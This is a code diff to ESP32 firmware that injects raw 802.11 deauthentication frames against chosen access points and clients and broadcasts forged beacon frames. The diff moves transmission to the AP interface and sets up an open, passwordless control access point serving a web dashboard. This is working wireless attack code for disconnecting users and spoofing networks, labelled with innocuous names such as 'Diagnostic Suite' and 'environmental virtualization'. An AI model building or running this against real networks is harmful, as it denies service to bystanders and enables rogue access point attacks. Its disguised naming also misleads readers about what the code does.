@@ -58,7 +58,7 @@ void sendDeauthFrame(uint8_t* bssid, uint8_t* client) {
         0x07, 0x00                          // Reason Code: Class 3 frame received from nonassociated STA
     };
 
-    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
+    esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
 }
 
 // Function to inject raw 802.11 Beacon Frames for environmental virtualization
@@ -98,7 +98,7 @@ void sendBeaconFrame(const char* ssid, uint8_t channel) {
     packet[chPos+1] = 0x01;
     packet[chPos+2] = channel;
 
-    esp_wifi_80211_tx(WIFI_IF_STA, packet, packetLen, false);
+    esp_wifi_80211_tx(WIFI_IF_AP, packet, packetLen, false);
 }
 
 // Full Web Dashboard Graphic Management Interface Markup
@@ -166,18 +166,14 @@ void setup() {
     Serial.begin(115200);
     delay(1000);
 
-    // Boot local Control Gateway Wireless Environment
-    WiFi.softAP("ESP32-Diagnostic-Suite", "");
-    Serial.print("[+] Control Console Gateway Address: http://");
-    Serial.println(WiFi.softAPIP());
-
-    // Prepare internal core registers for raw radio interactions
-    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
-    esp_wifi_init(&cfg);
-    esp_wifi_set_storage(WIFI_STORAGE_RAM);
-    esp_wifi_set_promiscuous_rx_cb(sniffer_callback);
-    esp_wifi_set_promiscuous(true);
-    esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
+    // Explicitly configure Access Point mode with open security (NULL password)
+    WiFi.mode(WIFI_AP);
+    if (WiFi.softAP("ESP32-Diagnostic-Suite", NULL)) {
+        Serial.print("[+] Control Console Gateway Address: http://");
+        Serial.println(WiFi.softAPIP());
+    } else {
+        Serial.println("[-] Failed to initialize Access Point interface.");
+    }
 
     // Operational Endpoint Configuration Definitions
     server.on("/", HTTP_GET, [](AsyncWebServerRequest *request){
